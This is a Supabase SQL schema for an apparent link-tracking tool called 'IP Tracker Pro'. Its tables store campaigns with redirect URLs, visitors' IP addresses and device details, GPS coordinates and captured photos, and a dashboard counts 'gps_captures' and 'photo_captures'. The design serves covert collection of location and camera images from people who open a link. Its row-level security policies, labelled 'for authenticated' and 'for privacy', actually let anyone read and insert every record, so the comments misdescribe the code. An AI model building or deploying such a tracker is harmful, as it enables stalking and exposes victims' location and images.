-- IP Tracker Pro - Supabase Database Schema
-- Run these SQL commands in your Supabase SQL Editor

-- 1. Create campaigns table
CREATE TABLE IF NOT EXISTS campaigns (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    campaign_id VARCHAR(255) UNIQUE NOT NULL,
    secret VARCHAR(255) NOT NULL,
    level INTEGER CHECK (level >= 1 AND level <= 3),
    title TEXT NOT NULL,
    redirect_url TEXT,
    message TEXT,
    created_at TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    updated_at TIMESTAMP WITH TIME ZONE DEFAULT NOW()
);

CREATE INDEX idx_campaigns_id ON campaigns(campaign_id);
CREATE INDEX idx_campaigns_created ON campaigns(created_at DESC);

-- 2. Create sessions table (IP & device data)
CREATE TABLE IF NOT EXISTS sessions (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id VARCHAR(255) UNIQUE NOT NULL,
    campaign_id VARCHAR(255) NOT NULL REFERENCES campaigns(campaign_id) ON DELETE CASCADE,
    ip_address VARCHAR(45),
    device VARCHAR(50),
    browser VARCHAR(100),
    os VARCHAR(100),
    user_agent TEXT,
    referer TEXT,
    accept_language VARCHAR(255),
    x_forwarded_for VARCHAR(255),
    is_forwarded BOOLEAN DEFAULT FALSE,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    FOREIGN KEY (campaign_id) REFERENCES campaigns(campaign_id) ON DELETE CASCADE
);

CREATE INDEX idx_sessions_id ON sessions(session_id);
CREATE INDEX idx_sessions_campaign ON sessions(campaign_id);
CREATE INDEX idx_sessions_timestamp ON sessions(timestamp DESC);
CREATE INDEX idx_sessions_ip ON sessions(ip_address);

-- 3. Create gps_data table
CREATE TABLE IF NOT EXISTS gps_data (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id VARCHAR(255) NOT NULL UNIQUE,
    latitude DECIMAL(10, 8),
    longitude DECIMAL(11, 8),
    accuracy DECIMAL(10, 2),
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
);

CREATE INDEX idx_gps_session ON gps_data(session_id);
CREATE INDEX idx_gps_timestamp ON gps_data(timestamp DESC);

-- 4. Create photos table
CREATE TABLE IF NOT EXISTS photos (
    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
    session_id VARCHAR(255) NOT NULL,
    photo_number INTEGER,
    photo_url TEXT,
    photo_data BYTEA,
    timestamp TIMESTAMP WITH TIME ZONE DEFAULT NOW(),
    FOREIGN KEY (session_id) REFERENCES sessions(session_id) ON DELETE CASCADE
);

CREATE INDEX idx_photos_session ON photos(session_id);
CREATE INDEX idx_photos_timestamp ON photos(timestamp DESC);

-- 5. Enable Row Level Security (RLS) for privacy
ALTER TABLE campaigns ENABLE ROW LEVEL SECURITY;
ALTER TABLE sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE gps_data ENABLE ROW LEVEL SECURITY;
ALTER TABLE photos ENABLE ROW LEVEL SECURITY;

-- 6. Create RLS policies (allow all for authenticated, restrict others)
CREATE POLICY "Enable read for all users" ON campaigns FOR SELECT USING (true);
CREATE POLICY "Enable insert for authenticated" ON campaigns FOR INSERT WITH CHECK (true);
CREATE POLICY "Enable update for authenticated" ON campaigns FOR UPDATE USING (true);

CREATE POLICY "Enable read for all users" ON sessions FOR SELECT USING (true);
CREATE POLICY "Enable insert for authenticated" ON sessions FOR INSERT WITH CHECK (true);

CREATE POLICY "Enable read for all users" ON gps_data FOR SELECT USING (true);
CREATE POLICY "Enable insert for authenticated" ON gps_data FOR INSERT WITH CHECK (true);

CREATE POLICY "Enable read for all users" ON photos FOR SELECT USING (true);
CREATE POLICY "Enable insert for authenticated" ON photos FOR INSERT WITH CHECK (true);

-- 7. Create materialized view for dashboard stats
CREATE MATERIALIZED VIEW IF NOT EXISTS dashboard_stats AS
SELECT
    COUNT(DISTINCT s.id) as total_hits,
    COUNT(DISTINCT s.ip_address) as unique_ips,
    COUNT(DISTINCT CASE WHEN g.id IS NOT NULL THEN s.id END) as gps_captures,
    COUNT(DISTINCT CASE WHEN p.id IS NOT NULL THEN s.id END) as photo_captures
FROM sessions s
LEFT JOIN gps_data g ON s.session_id = g.session_id
LEFT JOIN photos p ON s.session_id = p.session_id;

-- Grant permissions
GRANT SELECT ON campaigns TO postgres;
GRANT SELECT ON sessions TO postgres;
GRANT SELECT ON gps_data TO postgres;
GRANT SELECT ON photos TO postgres;
GRANT SELECT ON dashboard_stats TO postgres;
